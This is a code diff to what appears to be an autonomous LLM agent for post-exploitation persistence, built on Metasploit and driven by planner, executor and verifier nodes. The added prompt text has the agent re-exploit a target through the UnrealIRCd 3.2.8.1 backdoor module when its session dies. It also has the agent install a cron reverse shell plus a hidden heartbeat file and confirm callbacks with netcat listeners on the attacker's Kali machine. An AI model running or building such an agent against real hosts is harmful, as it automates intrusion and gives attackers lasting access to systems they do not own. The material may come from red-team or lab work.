@@ -206,12 +206,27 @@ You have 3 tools — each runs in a DIFFERENT place:
 Do NOT use `tool_metasploit_rpc` for target commands — it goes through the MSF console which is unreliable.
 Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not the target.
 
-**DEAD SESSION DETECTION:** If `tool_session_command` returns "Error: Session <id> not found",
-the session has died. Immediately call `tool_metasploit_rpc("sessions")` to list active sessions.
-If an active session to the target exists, switch to its ID for ALL remaining commands.
-If no active session exists at all, STOP making tool calls and state clearly in your summary that
-the session was dead — do NOT attempt any further persistence commands. Do NOT retry the original
-session_id after seeing the not-found error (retrying only burns your tool budget).
+**DEAD SESSION DETECTION & RECOVERY:** If `tool_session_command` returns "Error: Session <id> not found",
+the session has died (the IRC/web backdoor sessions handed to this stage are inherently unstable and
+may die MID-installation, e.g. between `whoami` and the crontab install). Immediately call
+`tool_metasploit_rpc("sessions")` to list active sessions.
+- If an active session to the target exists, switch to its ID and CONTINUE the persistence
+  installation from the beginning with that session ID (re-run the install steps — a half-installed
+  mechanism on a dead session is not persistent).
+- If NO active session exists at all, attempt ONE re-establishment of a session, because the
+  known-working initial vector for these targets is the UnrealIRCd backdoor on port 6667. Run, in
+  order:
+    1. tool_metasploit_rpc("use exploit/unix/irc/unreal_ircd_3281_backdoor")
+    2. tool_metasploit_rpc("set RHOSTS <target_ip>")
+    3. tool_metasploit_rpc("set LHOST {KALI_IP}")
+    4. tool_metasploit_rpc("set LPORT 4445")
+    5. tool_metasploit_rpc("run")
+  Then call tool_metasploit_rpc("sessions"); if a NEW session opened, switch to its ID and
+  install the persistence mechanism from the beginning with the new session ID.
+- ONLY if re-exploitation ALSO fails (no new session) do you STOP making tool calls and state
+  clearly in your summary that the session was dead and could not be re-established — do NOT
+  attempt any further persistence commands.
+Do NOT retry the ORIGINAL session_id after seeing the not-found error (retrying only burns budget).
 
 **UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session. This is a DIFFERENT failure mode from "Error: Session X not found". Immediately call `tool_metasploit_rpc('sessions')` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with a simple newline or `echo test`. If still `(no output)`, STOP making tool calls and state clearly: 'Session unresponsive — no output from diagnostic command. Cannot confirm persistence was installed.' Do NOT claim success from silent output on a diagnostic command — `(no output)` is NOT evidence of success.
 
@@ -246,6 +261,16 @@ that it is listed), start a background listener on Kali first so the connection
 is not refused: tool_linux_terminal("nohup nc -lvnp 4444 >/tmp/persist_listener.log 2>&1 &").
 Otherwise, verification will rely on confirming the entry is listed, the cron
 daemon is running, and the shell binary exists.
+
+**Cron heartbeat (install ALONGSIDE the reverse shell):** If cron is your chosen
+technique, ALSO install a file-write heartbeat cron in the SAME crontab. This
+proves the cron daemon actually fires every minute even if /dev/tcp is blocked
+on the target (some hardened kernels disable it), giving the verifier a
+ground-truth artifact instead of a silent reverse shell. Install BOTH lines at
+once so you do not clobber the reverse-shell entry:
+  tool_session_command("3", "(crontab -l 2>/dev/null; echo \\"* * * * * /bin/sh -c 'date >> /tmp/.hb'\\") | crontab -")
+Then confirm with tool_session_command("3", "crontab -l"). The verifier will
+later cat /tmp/.hb to prove execution.
 
 **Step-by-step example for SSH key injection (session 3):**
 
@@ -312,10 +337,25 @@ Cron Job:
      listed but the reverse shell will NOT fire. In that case set STATUS to
      PARTIAL (not WORKING) and note it in EVIDENCE so the critic knows a
      file-write heartbeat fallback is needed.
-- If the cron entry is a reverse shell, you cannot directly confirm it fires
-  without a listener on Kali. Treat it as WORKING only when all FOUR checks
-  above pass: entry listed AND cron daemon active AND shell binary present AND
-  /dev/tcp available.
+  5. HEARTBEAT / CALLBACK CONFIRMATION (REQUIRED for STATUS: WORKING). A listed
+     entry + live daemon + /dev/tcp is NOT proof the reverse shell actually
+     connects back. Confirm execution with EITHER:
+       (a) If a file-write heartbeat cron (writing to /tmp/.hb) was installed:
+           wait ~65 seconds, then ON TARGET:
+           `tool_session_command("<session_id>", "cat /tmp/.hb")`.
+           If the file exists and has entries (has grown), the cron daemon is
+           PROVEN to fire jobs — this satisfies WORKING.
+       (b) If no heartbeat exists, start a Kali listener and wait for the
+           reverse shell to call back:
+           `tool_linux_terminal("timeout 75 nc -lvnp 4444")`.
+           If a connection from the target arrives within 75s — WORKING.
+     If NEITHER a grown heartbeat nor a callback is confirmed, the mechanism is
+     unproven: STATUS must be PARTIAL (not WORKING).
+- If the cron entry is a reverse shell, you cannot claim it fires without a
+  confirmed callback or heartbeat. Treat it as WORKING only when checks 1-4 pass
+  AND check 5 confirms actual execution (grown /tmp/.hb OR a listener callback).
+  If checks 1-4 pass but check 5 cannot confirm execution, report PARTIAL and
+  note that a file-write heartbeat cron is the recommended fallback.
 
 Systemd Service:
 - ON TARGET: `tool_session_command("<session_id>", "systemctl is-enabled <service>")`
@@ -568,6 +608,13 @@ def _get_recommended_techniques(access_level: str, session_type: str, session_id
         output += f"   Notes: {t['notes']}\n"
 
     output += "\nUse these FIRST. Only query the knowledge base if all recommended techniques have failed.\n"
+    output += (
+        "\n**DEAD-SESSION RECOVERY VECTOR:** The sessions handed to this stage often come from the "
+        "UnrealIRCd 3.2.8.1 backdoor (port 6667), which is unstable and can die mid-installation. "
+        "If the session dies and no live substitute exists, the executor may re-establish one with "
+        "exploit/unix/irc/unreal_ircd_3281_backdoor (set RHOSTS=<target>, LHOST=" + KALI_IP + ", run) "
+        "and then resume installation on the new session ID.\n"
+    )
     return output
 
 
@@ -689,15 +736,21 @@ def executor_node(state: PersistenceState) -> dict:
         if isinstance(msg, ToolMessage):
             executor_tool_count += 1
 
-    # Build message window from planner output
-    executor_msgs = []
-    capturing = False
-    for msg in messages:
-        if isinstance(msg, AIMessage) and "[Persistence Planner]" in (msg.content or ""):
-            capturing = True
-        if capturing:
-            executor_msgs.append(msg)
-    if not executor_msgs:
+    # Build message window from planner output. Bound the capture to the CURRENT
+    # retry cycle ONLY: anchor at the MOST RECENT planner tag, not the first one.
+    # Capturing from the first planner tag would let the window span two planner
+    # cycles, interleaving executor AI+tool pairs from different cycles (and any
+    # trimmed/dangling tool_calls) in confusing ways that _sanitize_message_window
+    # can only patch with dummy ToolMessages.
+    cycle_start_idx = None
+    for i in range(len(messages) - 1, -1, -1):
+        m = messages[i]
+        if isinstance(m, AIMessage) and "[Persistence Planner]" in (m.content or ""):
+            cycle_start_idx = i
+            break
+    if cycle_start_idx is not None:
+        executor_msgs = list(messages[cycle_start_idx:])
+    else:
         executor_msgs = [messages[-1]]
     executor_msgs = _sanitize_message_window(executor_msgs)
 
@@ -796,10 +849,45 @@ def verifier_node(state: PersistenceState) -> dict:
             f"SESSION: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
             f"\nVerify the mechanism works by testing it now."
         )
+        # For a cron reverse-shell, a listed entry + live daemon + /dev/tcp is NOT
+        # proof the callback actually arrives. Require a CONFIRMED callback (or a
+        # heartbeat artifact) before allowing STATUS: WORKING — otherwise the
+        # critic false-PASSes a shell that fails silently every minute.
+        plan_install_blob = f"{persistence_plan}\n{install_result}".lower()
+        if "cron" in plan_install_blob:
+            context += (
+                "\n\n**CRON REVERSE-SHELL — CONFIRMED-CALLBACK REQUIREMENT:** "
+                "After confirming the entry is listed, the cron daemon is active, the shell "
+                "binary exists, and /dev/tcp is available, you MUST ALSO confirm the mechanism "
+                "actually fires before reporting STATUS: WORKING. Use EITHER of these:\n"
+                f"  (a) LISTENER CALLBACK — start a background listener on Kali and wait for a "
+                f"connection: tool_linux_terminal(\"timeout 75 nc -lvnp 4444\"). If a connection "
+                f"from the target arrives within 75s, STATUS: WORKING.\n"
+                "  (b) HEARTBEAT ARTIFACT — if a file-write heartbeat cron was installed "
+                "(writing to /tmp/.hb), wait ~65 seconds then ON TARGET: "
+                "tool_session_command(<id>, \"cat /tmp/.hb\"). If the file exists and has grown, "
+                "the cron daemon is PROVEN to execute jobs — STATUS: WORKING.\n"
+                "If NEITHER a callback nor a grown heartbeat is confirmed, report STATUS: PARTIAL "
+                "with EVIDENCE noting the cron entry installs but no callback/execution was "
+                "confirmed — the critic should then FAIL and the next attempt should add a "
+                "file-write heartbeat cron. Do NOT force STATUS: WORKING on a cron entry without "
+                "a confirmed callback or heartbeat."
+            )
         verifier_msgs = [HumanMessage(content=context)]
     else:
-        # Continuing ReAct loop — use recent messages, sanitized to avoid orphaned ToolMessages
-        verifier_msgs = _sanitize_message_window(list(messages[-min(10, len(messages)):]))
+        # Continuing ReAct loop. Anchor the window at the most recent HumanMessage
+        # that carries the cycle's "PERSISTENCE PLAN" entry context rather than a
+        # fixed tail: after a full planner+executor cycle the message list easily
+        # exceeds 10, so a bare tail can drop the install-mechanism context and
+        # leave the LLM verifying against nothing. Walk back to the anchor, then
+        # take from it to the end (capped to a 10-msg tail if no anchor is found).
+        anchor = next(
+            (i for i in range(len(messages) - 1, -1, -1)
+             if isinstance(messages[i], HumanMessage)
+             and "PERSISTENCE PLAN" in (messages[i].content or "")),
+            max(0, len(messages) - 10),
+        )
+        verifier_msgs = _sanitize_message_window(list(messages[anchor:]))
 
     # Safety valve
     if verifier_tool_count >= MAX_VERIFIER_TOOL_CALLS:
